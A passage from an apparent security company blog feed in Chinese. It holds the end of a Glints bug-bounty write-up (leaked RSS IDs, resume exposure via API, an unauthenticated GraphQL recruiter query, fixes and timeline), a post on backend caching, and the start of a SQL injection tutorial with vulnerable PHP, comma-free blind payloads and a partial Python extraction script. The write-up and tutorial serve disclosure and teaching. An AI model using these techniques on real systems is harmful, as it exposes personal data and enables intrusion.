的權限控管不當，導致使用者資訊洩露</h2>\n<p>Glints 提供了一個職缺應徵者的 RSS feed，方便雇主串接 Slack 或其他服務，就能看到某個職缺最新的應徵者資訊：</p>\n<p><img src=\"/img/posts/huli/how-i-hacked-glints-and-your-resume/p3-rss.png\" alt=\"rss\"></p>\n<p>回傳的資訊有應徵者的姓名、電子郵件跟履歷，內容大概是這樣：</p>\n<p><img src=\"/img/posts/huli/how-i-hacked-glints-and-your-resume/p4-rss-content.png\" alt=\"rss content\"></p>\n<p>而 RSS 的網址長這樣：<code>https://employers.glints.com/api/feed/jobs/{RSS_ID}/approved-candidates?UserId={companyOwnerId}</code></p>\n<p>需要這個職缺專屬的 RSS ID 跟所屬公司的管理員 ID 才能正確打開 RSS 的連結，而管理員 ID 很容易可以取得，因為公司資訊都是公開的，所以從 Glints 的公司頁面中可以直接看到公司管理員的 User ID，但是 RSS ID 要怎麼取得呢？</p>\n<p>我發現有個拿公司底下職缺的 API 網址如下：<code>https://employers.glints.tw/api/companies/03638b7f-2da0-4b68-9e92-1be9350600ba/jobs?where={&quot;status&quot;:&quot;open&quot;}&amp;include=jobSalaries,Groups,City,Country</code></p>\n<p>從 API response、傳進去的參數跟欄位的命名這三點中，我推測背後用的應該是 <a href=\"https://sequelize.org/\">Sequelize</a> 這一套 Node.js 的 ORM，為什麼我會知道呢？因為我也用過這一套，像是 where 的規則跟 <code>include</code> 這個名稱，都是 Sequelize 的操作方式。</p>\n<p>於是，我猜測後端有可能是直接把 query string 整個 object 丟進去 Sequelize 做處理，不過試了一下之後發現好像不是，還是有一些限制，但至少我新加的一個參數：attributes 有效！</p>\n<p>attributes 這個參數在 Sequelize 裡面是決定回傳值要有哪些欄位，例如說 <code>attributes=id</code>，那回傳的資料裡面就只會有 ID，因此我在 attributes 裡面放上了 <code>rssId</code>，結果 response 裡面就真的出現這個欄位了：</p>\n<p><img src=\"/img/posts/huli/how-i-hacked-glints-and-your-resume/p5-rss-id.png\" alt=\"rss-id\"></p>\n<p>因此，我們可以透過這個方式取得任意職缺的 RSS ID，那既然有了 RSS ID 跟公司管理員的 ID，跟上一個漏洞一樣，我們可以自動化去跑，就可以透過 RSS feed 來取得所有職缺的應徵者資訊。</p>\n<h3 id=\"%E4%BF%AE%E8%A3%9C%E6%96%B9%E5%BC%8F-2\"><a class=\"direct-link\" href=\"#%E4%BF%AE%E8%A3%9C%E6%96%B9%E5%BC%8F-2\">#</a> 修補方式</h3>\n<p>因為這個功能使用率極低，所以後來 Glints 直接把這功能拔掉了。</p>\n<h2 id=\"3.-%E4%BD%BF%E7%94%A8%E8%80%85%E8%B3%87%E8%A8%8A%E6%B4%A9%E9%9C%B2\"><a class=\"direct-link\" href=\"#3.-%E4%BD%BF%E7%94%A8%E8%80%85%E8%B3%87%E8%A8%8A%E6%B4%A9%E9%9C%B2\">#</a> 3. 使用者資訊洩露</h2>\n<p>前兩個漏洞都是從雇主那端才能利用的漏洞，而這一個則是任何人都可以利用。</p>\n<p>當你在 Glints 求職平台註冊一個帳號以後，你會有一個 User ID 以及公開的個人頁面，像是這樣：<a href=\"https://glints.com/tw/profile/public/44007523-f7a8-411d-b2c4-57c68a976534\">https://glints.com/tw/profile/public/44007523-f7a8-411d-b2c4-57c68a976534</a></p>\n<p><img src=\"/img/posts/huli/how-i-hacked-glints-and-your-resume/p6-page.png\" alt=\"public page\"></p>\n<p>網址列上的那一串 <code>44007523-f7a8-411d-b2c4-57c68a976534</code> 就是我的 User ID。</p>\n<p>而有另外一個 API 也可以拿到使用者的公開資訊：<a href=\"https://glints.com/api/publicProfiles/44007523-f7a8-411d-b2c4-57c68a976534\">https://glints.com/api/publicProfiles/44007523-f7a8-411d-b2c4-57c68a976534</a></p>\n<p><img src=\"/img/posts/huli/how-i-hacked-glints-and-your-resume/p7-profile-api.png\" alt=\"profile api\"></p>\n<p>可以看出在 API 的回傳資訊中，已經有特別過濾掉具有敏感資訊的欄位，像是手機以及 email 等等，但卻有一個欄位忘記過濾掉，叫做 resume。這個欄位存的會是一個檔案名稱，像是這樣：<code>badf34128adefqcxsq.pdf</code>，而 Glints 上的履歷都放在同一個地方，網址的規則是： <a href=\"https://glints-dashboard.s3.ap-southeast-1.amazonaws.com/resume/xxxxx.pdf\">https://glints-dashboard.s3.ap-southeast-1.amazonaws.com/resume/xxxxx.pdf</a></p>\n<p>換句話說，只要知道履歷的檔名，就可以拿到履歷的內容。因此，我只要知道某個使用者的 ID，我就可以透過上面的 API 拿到他的履歷檔名，再透過固定規則拿到履歷的檔案，而通常履歷上都會有 email 以及電話等等的資訊（有些甚至還有地址）。</p>\n<p>可是，我們要怎麼知道使用者的 ID 呢？</p>\n<p>有幾個方式，第一個是 Glints 在有些國家有論壇的功能，在論壇就可以透過 API 直接看到那些發文跟回文的人的 ID，第二個方式則是 Google。</p>\n<p>因為個人頁面的網址規則都是一樣的，所以只要 google：<code>inurl:profile/public site:glints.com</code>，就能找到一大串的搜尋結果，就可以從網址中取得 User ID，並且透過 ID 拿到他們的履歷。</p>\n<p><img src=\"/img/posts/huli/how-i-hacked-glints-and-your-resume/p8-google.png\" alt=\"google hacking\"></p>\n<h3 id=\"%E4%BF%AE%E8%A3%9C%E6%96%B9%E5%BC%8F-3\"><a class=\"direct-link\" href=\"#%E4%BF%AE%E8%A3%9C%E6%96%B9%E5%BC%8F-3\">#</a> 修補方式</h3>\n<p>Glints 修改了 API 的回傳值，隱藏了 resume 欄位</p>\n<h2 id=\"4.-%E6%8B%9B%E5%8B%9F%E4%BA%BA%E5%93%A1%E8%B3%87%E6%96%99%E6%B4%A9%E6%BC%8F\"><a class=\"direct-link\" href=\"#4.-%E6%8B%9B%E5%8B%9F%E4%BA%BA%E5%93%A1%E8%B3%87%E6%96%99%E6%B4%A9%E6%BC%8F\">#</a> 4. 招募人員資料洩漏</h2>\n<p>上面幾個漏洞都是跟一般使用者有關的，我們來看看一個不一樣的。</p>\n<p>除了 Glints 的主站以外，我也針對了 Glints 去做子網域的掃描，找到了一個頁面：<a href=\"https://superpowered.glints.com/\">https://superpowered.glints.com/</a></p>\n<p><img src=\"/img/posts/huli/how-i-hacked-glints-and-your-resume/p9-website.png\" alt=\"website\"></p>\n<p>這頁面需要特定的 Google 帳號才能登入，看起來沒什麼機會，但我們可以從 JS 檔案裡面去尋找一些線索！通常這些檔案都是 minified 過的所以不好看懂，但我們可以直接用關鍵字搜尋，去找找看有沒有我們感興趣的資訊，我下的關鍵字是：<code>query</code></p>\n<p><img src=\"/img/posts/huli/how-i-hacked-glints-and-your-resume/p10-query.png\" alt=\"search query\"></p>\n<p>從關鍵字搜尋中，可以找到一個 GrapgQL 的 query 叫做 <code>findRecruiters</code>，而參數的部分也可以從程式碼中得知，或是也可以利用 error message 去慢慢試出來，整個 API 長這樣：</p>\n<pre class=\"language-json\"><code class=\"language-json\">query <span class=\"token punctuation\">{</span><br>    findRecruiters(input<span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>) <span class=\"token punctuation\">{</span><br>        id<span class=\"token punctuation\">,</span><br>        email<span class=\"token punctuation\">,</span><br>        role<span class=\"token punctuation\">,</span><br>        displayName<span class=\"token punctuation\">,</span><br>        fullName<span class=\"token punctuation\">,</span><br>        jobTitle<span class=\"token punctuation\">,</span><br>        jobStatus<br><br>        team <span class=\"token punctuation\">{</span><br>            labels<br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>從 JS 中找到了 API URL 跟 query 的格式，打了這個 API 之後，發現並沒有鎖權限。</p>\n<p>從 response 中我們可以得到每一個招募人員的姓名、職稱、所屬的團隊以及 email：</p>\n<p><img src=\"/img/posts/huli/how-i-hacked-glints-and-your-resume/p11-response.png\" alt=\"response\"></p>\n<h3 id=\"%E4%BF%AE%E8%A3%9C%E6%96%B9%E5%BC%8F-4\"><a class=\"direct-link\" href=\"#%E4%BF%AE%E8%A3%9C%E6%96%B9%E5%BC%8F-4\">#</a> 修補方式</h3>\n<p>Glints 增加了權限控制，確保訪客無法取得相關資訊。</p>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> 結語</h2>\n<p>這次在 Glints 發現的漏洞皆為權限控管相關的問題，當權限沒有管理好的時候，就很容易可以取得其他人的資訊。特別是對 Glints 這種求職平台來說，使用者的個人資訊價值比較高，因為履歷上通常都會有電話、姓名、email 或甚至是地址，有許多的個資都在上面。</p>\n<p>也因為如此，這次發現的四個漏洞的嚴重程度都被評為「高」，一個的獎金是 400 SGD，總共是 1600 SGD，折合台幣約 32000 元。</p>\n<p>最後，附上這次回報的時間軸：</p>\n<ul>\n<li><code>2021-07-09</code> 第一次漏洞回報</li>\n<li><code>2021-07-09</code> Glints 回信說正在調查漏洞</li>\n<li><code>2021-07-13</code> Glints 回信確認漏洞存在，修復中</li>\n<li><code>2021-07-14</code> 第二次漏洞回報</li>\n<li><code>2021-07-20</code> Glints 回信確認所有我回報的漏洞的狀態，一個已修復，其他還在修</li>\n<li><code>2021-08-18</code> 我第一次寫信去確認漏洞的最新狀況，無回應</li>\n<li><code>2021-08-31</code> 我第二次寫信去確認漏洞的最新狀況，無回應</li>\n<li><code>2021-09-09</code> 我第三次寫信去確認漏洞的最新狀況，無回應</li>\n<li><code>2021-09-20</code> 我在他們的 GitHub repo 上開 issue 詢問 bug bounty program 是否還存在，無回應</li>\n<li><code>2021-10-04</code> Glints 回信說他們在確認中，隔天會告訴我詳細狀況</li>\n<li><code>2021-10-20</code> 上一封信之後無下文，因此我再次寄信詢問狀況</li>\n<li><code>2021-10-26</code> 因距離漏洞回報已三個多月仍未修復且未告知修補狀況，我在個人社群平台上呼籲有用這服務的朋友們可以把個資刪掉以免外洩，隔天得到 co-founder 回應會盡快處理</li>\n<li><code>2021-10-27</code> Glints 詢問我收款相關資訊</li>\n<li><code>2021-11-11</code> 我確認收到其中一個漏洞的獎金，寫信詢問其他漏洞的狀況</li>\n<li><code>2021-11-11</code> Glints 回信確認漏洞皆已修復</li>\n<li><code>2021-12-07</code> 收到已修復漏洞的獎金</li>\n</ul>\n",
      "date_published": "2022-02-08T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/genchilu/cache-strategy-zh/",
      "url": "https://tech-blog.cymetrics.io/posts/genchilu/cache-strategy-zh/",
      "title": "來談談後端快取策略",
      "content_html": "<!-- summary -->\n<p>快取是後端系統提升 latency time 最常用的手段之一。在設計快取架構時有幾個值得注意的點，這篇文章會簡單討論這些細節在實作上常見的策略。</p>\n<!-- summary -->  \n<h2 id=\"%E5%BF%AB%E5%8F%96%E5%A4%9A%E5%B0%91%E8%B3%87%E6%96%99%3F\"><a class=\"direct-link\" href=\"#%E5%BF%AB%E5%8F%96%E5%A4%9A%E5%B0%91%E8%B3%87%E6%96%99%3F\">#</a> 快取多少資料?</h2>\n<p>在規劃快取時，我們需要先評估要快取多少資料在記憶體。尤其在有大量資料的系統，我們可以根據事前評估需要的記憶體大小，決定快取是否需要使用 cluster cache。<br>\n常見的評估方法是利用 80/20 法則 - 80% 的流量由 20% 的資料造成。基於 80/20 法則下，預期快取 20% 的資料可以提升 80% 的 request latency time。舉例來說，如果我們的系統每天有 10M 個活躍用戶，每個用戶提供給前端系統使用的 metadata 為 500k，那我們需要快取的資料為：<br>\n<code>500k * 10M * 0.2 = 100G</code><br>\n目前雲端供應商的 VM 規格記憶體最大約在 512G 左右，因此一台 VM 的規格即可應付。值得一提的是，在某些極度要求 request lanency 的場景下，將全部資料塞到快取也是可以接受的做法，在設計快取架構時還是需要先明確目標。</p>\n<h2 id=\"cache-cluster\"><a class=\"direct-link\" href=\"#cache-cluster\">#</a> Cache cluster</h2>\n<p>有時候評估完所需要的快取空間後發現無法塞到一台機器裡面，這時候我們會想要一個 cache cluster 來分散記憶體需求到多台機器。架構上可能會像這樣有一台服務幫忙將 request 導到對應的 cache 上要資料。</p>\n<p><img src=\"/img/posts/genchilu/cache-strategy/cache-cluster.png\" alt=\"\"></p>\n<p>而為了讓 cache service 知道那個 request 要去那個 cache 拿資料，通常我們會使用 hash 機制，例如我們以 request-id 做 hash key，用 mod 做 hash function，如下：</p>\n<p><img src=\"/img/posts/genchilu/cache-strategy/cash-native-hash-1.png\" alt=\"\"></p>\n<p>但這樣會有個問題，新增或刪減 cache cluster 內的 node 數量時會造成大量資料搬遷。舉例來說，假設目前 cache cluster 的資料如下：</p>\n<p><img src=\"/img/posts/genchilu/cache-strategy/cash-native-hash-2.png\" alt=\"\"></p>\n<p>如果新增一台 cache 到 cluster，資料分布就會如下：</p>\n<p><img src=\"/img/posts/genchilu/cache-strategy/cash-native-hash-3.png\" alt=\"\"></p>\n<p>可以看到單純新增一台 cache 以後，會有八筆資料需要搬遷到正確的 cache node 上，這樣的 cache cluster 對水平擴展是極度不友善的。</p>\n<p>上述的問題主要是因為 cache cluster node 數量變化導致 hash 後的位置不一致。為了解決這問題，可以使用 Consistent hashing 減少 node 數量變化時需要搬遷的資料數量。</p>\n<blockquote>\n<p>Consistent hashing 運作機制不在本篇文章討論範圍，詳細演算法可以參考 <a href=\"https://en.wikipedia.org/wiki/Consistent_hashing\">wiki</a>。</p>\n</blockquote>\n<h2 id=\"%E6%9B%BF%E6%8F%9B%E7%AD%96%E7%95%A5\"><a class=\"direct-link\" href=\"#%E6%9B%BF%E6%8F%9B%E7%AD%96%E7%95%A5\">#</a> 替換策略</h2>\n<p>前面提到通常我們不會將全部的資料都存到快取裡面，而會給快取一個容量限制。當快取內的資料到達容量上限時，需要一個策略決定要替換掉那個資料。常見的策略有：</p>\n<ul>\n<li><a href=\"https://medium.com/r?url=https%3A%2F%2Fzh.wikipedia.org%2Fwiki%2F%25E5%2585%2588%25E9%2580%25B2%25E5%2585%2588%25E5%2587%25BA%25E6%25BC%2594%25E7%25AE%2597%25E6%25B3%2595\">先進先出演算法（FIFO）</a>：最早進入快取的資料優先替換</li>\n<li><a href=\"https://en.wikipedia.org/wiki/Least_frequently_used\">最少使用演算法（LFU）</a>：使用次數最少的快取優先替換掉</li>\n<li><a href=\"https://medium.com/r?url=https%3A%2F%2Fzh.wikipedia.org%2Fw%2Findex.php%3Ftitle%3D%25E6%259C%2580%25E8%25BF%2591%25E6%259C%2580%25E5%25B0%2591%25E4%25BD%25BF%25E7%2594%25A8%25E7%25AE%2597%25E6%25B3%2595%26action%3Dedit%26redlink%3D1\">最近最少使用演算法（LRU）</a>：最近最少使用的內容作為替換物件</li>\n</ul>\n<h2 id=\"%E6%9B%B4%E6%96%B0%E7%AD%96%E7%95%A5\"><a class=\"direct-link\" href=\"#%E6%9B%B4%E6%96%B0%E7%AD%96%E7%95%A5\">#</a> 更新策略</h2>\n<p>當資料更新時，快取內的資料也需要更新，避免用戶讀取到就資料。常見的更新策略有：</p>\n<ol>\n<li>write-through：在更新 DB 資料的時候同步更新快取資料，這策略將會大幅保證資料一制性，缺點是會增加更新資料的 loading，在頻繁更新資料的場景中不建議使用。</li>\n<li>write around：在更新資料時僅更新 DB，直到用戶需要讀取資料時才同時更新快取；缺點是在更新完資料的前幾次讀取可能會有 cache miss，造成 request 直接存取 DB。</li>\n<li>write back：更新資料時僅更新快取資料，而在一段時間後將所有更新資料一起寫回 DB，這策略在 write heavy 的場景看大福提升 latency 和 throughput；缺點是若在快取寫回 DB 前快取系統異常，會有資料遺失的風險。</li>\n</ol>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>快取存在在系統架構的每一層中，硬體 (CPU，硬碟)到作業系統，從 backend Application 到用戶端 (browser，app)。這本篇文章中，我們討論了怎麼有效的利用快取有限的空間，如何讓快取架構可水平擴展、快取資料的替換策略以及快取資料的更新策略。透過思考這些策略，可以更好的幫助我們實作更符合自己使用情境的快取架構。</p>\n",
      "date_published": "2022-01-25T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/sql-injection-in-action/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/sql-injection-in-action/",
      "title": "SQL injection 實戰：在限制底下提升速度",
      "content_html": "<!-- summary -->\n<p>前陣子我們團隊在執行滲透測試時，發現了一個有趣的 SQL injection 案例，因為一些特性的關係，沒辦法直接用現成工具撈出資料，需要自己改工具或是寫腳本才能有效利用。因此，這篇將會分享兩個實際案例，以及我自己的幾個解法。</p>\n<!-- summary -->\n<p>我有把這兩個案例放到 Heroku 上面，做成兩個小挑戰，有興趣的可以自己先玩玩看：</p>\n<ol>\n<li><a href=\"https://od-php.herokuapp.com/sql/search.php?source=1\">https://od-php.herokuapp.com/sql/search.php?source=1</a></li>\n<li><a href=\"https://od-php.herokuapp.com/sql/availability.php?source=1\">https://od-php.herokuapp.com/sql/availability.php?source=1</a></li>\n</ol>\n<p>原本的案例是類似訂房網站的東西，所以這兩個挑戰其實也都是訂房網站會有的功能，第一個是搜尋功能，第二個則是訂房查詢的功能。</p>\n<p>第一個挑戰需要從指定的 table 中拿出 flag，第二個挑戰的 flag 隱藏在其他 table 中，請找出那張 table 並且把 flag 取出，flag 格式為：<code>cymetrics{a-z_}</code></p>\n<p>因為 Heroku 有自動休眠機制，所以可能會等個五六秒才看到畫面，這是正常的。</p>\n<p>兩題的難度我覺得其實都不高，但重點是如何找出更有效率的解法，底下是兩個案例的講解以及我自己的解法。</p>\n<h2 id=\"%E6%A1%88%E4%BE%8B%E4%B8%80%EF%BC%9A%E6%90%9C%E5%B0%8B%E5%8A%9F%E8%83%BD\"><a class=\"direct-link\" href=\"#%E6%A1%88%E4%BE%8B%E4%B8%80%EF%BC%9A%E6%90%9C%E5%B0%8B%E5%8A%9F%E8%83%BD\">#</a> 案例一：搜尋功能</h2>\n<p>第一個案例是一個搜尋的功能，有一個 table 叫做 home，存著三個欄位：id、name 跟 tags，而 tags 是一個用逗號分割的字串，用來標示這筆資料有哪些 tag。</p>\n<p>如果沒傳入任何東西，會回傳底下的資料：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token punctuation\">[</span><br>    <span class=\"token punctuation\">{</span><br>        <span class=\"token string\">\"id\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token string\">\"name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"home1\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token string\">\"tags\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"1,2,3,4\"</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>    <span class=\"token punctuation\">{</span><br>        <span class=\"token string\">\"id\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token string\">\"name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"home2\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token string\">\"tags\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"1,5\"</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">]</span></code></pre>\n<p>因此我們可以知道資料庫裡一共有兩筆資料，接著我們可以傳入 <code>tag</code> 來 filter，找出指定的資料，像是這樣：</p>\n<p><a href=\"https://od-php.herokuapp.com/sql/search.php?tag=5\">https://od-php.herokuapp.com/sql/search.php?tag=5</a></p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token punctuation\">[</span><br>    <span class=\"token punctuation\">{</span><br>        <span class=\"token string\">\"id\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token string\">\"name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"home2\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token string\">\"tags\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"1,5\"</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">]</span></code></pre>\n<p>tag 參數可以用逗號分格，一次搜尋多個值，像這樣：</p>\n<p><a href=\"https://od-php.herokuapp.com/sql/search.php?tag=2,5\">https://od-php.herokuapp.com/sql/search.php?tag=2,5</a></p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token punctuation\">[</span><br>    <span class=\"token punctuation\">{</span><br>        <span class=\"token string\">\"id\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token string\">\"name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"home1\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token string\">\"tags\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"1,2,3,4\"</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>    <span class=\"token punctuation\">{</span><br>        <span class=\"token string\">\"id\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token string\">\"name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"home2\"</span><span class=\"token punctuation\">,</span><br>        <span class=\"token string\">\"tags\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"1,5\"</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">]</span></code></pre>\n<p>功能大概就是這樣子而已，原本的實際案例會更複雜一點，但為了精簡因此只保留最精華的部分，其他無關的東西都拿掉了。</p>\n<p>接著，我們來看一下重點程式碼：</p>\n<pre class=\"language-php\"><code class=\"language-php\"><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT id, name, tags from home \"</span><span class=\"token punctuation\">;</span><br><br><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"sleep\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"QQ\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tag</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token variable\">$tag_arr</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">','</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$tag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>  <span class=\"token variable\">$sql_tag</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br>  <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$tag_arr</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$k</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$v</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      <span class=\"token function\">array_push</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql_tag</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"( FIND_IN_SET(<span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$v</span><span class=\"token punctuation\">}</span></span>, tags) )\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>  <span class=\"token punctuation\">}</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql_tag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      <span class=\"token variable\">$sql</span><span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"where (\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">implode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">' OR '</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$sql_tag</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\")\"</span><span class=\"token punctuation\">;</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>這邊直接用字串拼接的方式組成 SQL query，因此很明顯有 SQL injection 的漏洞，如果你傳入 <code>?tag='</code>，SQL query 就會出錯，為了方便大家 debug，錯誤時會把 SQL query 印出來。</p>\n<p>想要撈出其他資料，一個很直覺的想法是利用 <code>union</code>，但這招在這裡行不通，原因是我們傳進去的參數會用 <code>,</code> 來分割，所以我們的 payload 裡不能有逗號，不然會把整個 query 搞壞，變成很奇怪的樣子。</p>\n<p>因此這題有趣的地方之一在於如何不用逗號，利用這個漏洞。</p>\n<p>一個簡單直覺的做法是用 case when 搭配 sleep，像這樣：</p>\n<pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token keyword\">case</span> <span class=\"token keyword\">when</span> <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">\"c%\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">then</span> <span class=\"token number\">1</span> <span class=\"token keyword\">else</span> sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">end</span> <span class=\"token keyword\">from</span> flag<span class=\"token punctuation\">)</span></code></pre>\n<p>從 response 的回傳時間，可以推測出條件有沒有成立，但因為程式碼把 sleep 給擋掉了，所以沒辦法這樣用（原本的案例是沒有擋這個的，是我額外加上去的）。</p>\n<p>但其實仔細觀察會發現我們不需要 sleep，可以利用 case when 的回傳值做原本的 filter 功能，從結果中推測哪個條件成立，像這樣：</p>\n<pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token keyword\">case</span> <span class=\"token keyword\">when</span> <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">\"c%\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">then</span> <span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">10</span> <span class=\"token keyword\">end</span> <span class=\"token keyword\">from</span> flag<span class=\"token punctuation\">)</span></code></pre>\n<p>當條件（<code>content like 'c%'</code>）成立時，回傳值就是 1，反之則是 10，而如果是 1 的話，回傳的 JSON 就會有資料，10 的話則沒有，因此我們可以根據有或沒有，得知條件是否成立。</p>\n<p>接著，我們就來寫一下這種最簡單做法的腳本。</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># exploit-search.py</span><br><span class=\"token keyword\">import</span> requests<br><span class=\"token keyword\">import</span> datetime<br><span class=\"token keyword\">import</span> json<br><br>host <span class=\"token operator\">=</span> <span class=\"token string\">'https://od-php.herokuapp.com/sql'</span><br>char_index <span class=\"token operator\">=</span> <span class=\"token number\">0</span><br>char_set <span class=\"token operator\">=</span> <span class=\"token string\">'abcdefghijklmnopqrstuvwxyz}_'</span><br>result <span class=\"token operator\">=</span> <span class=\"token string\">'cymetrics{'</span><br><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span><br>  <span class=\"token keyword\">if</span> char_index <span class=\"token operator\">>=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>char_set<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"end\"</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">break</span><br><br>  char <span class=\"token operator\">=</span> char_set<span class=\"token punctuation\">[</span>char_index<span class=\"token punctuation\">]</span><br>  payload <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'(select case when (content like \"</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>result<span class=\"token punctuation\">}</span></span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>char<span class=\"token punctuation\">}</span></span><span class=\"token string\">%\") then 1 else 10 end from flag)'</span></span><br>  response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>host<span class=\"token punctuation\">}</span></span><span class=\"token string\">/search.php?tag=</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>payload<span class=\"token punctuation\">}</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"trying\"</span><span class=\"token punctuation\">,</span> char<span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">if</span> response<span class=\"token punctuation\">.</span>ok<span class=\"token punctuation\">:</span><br>    data <span class=\"token 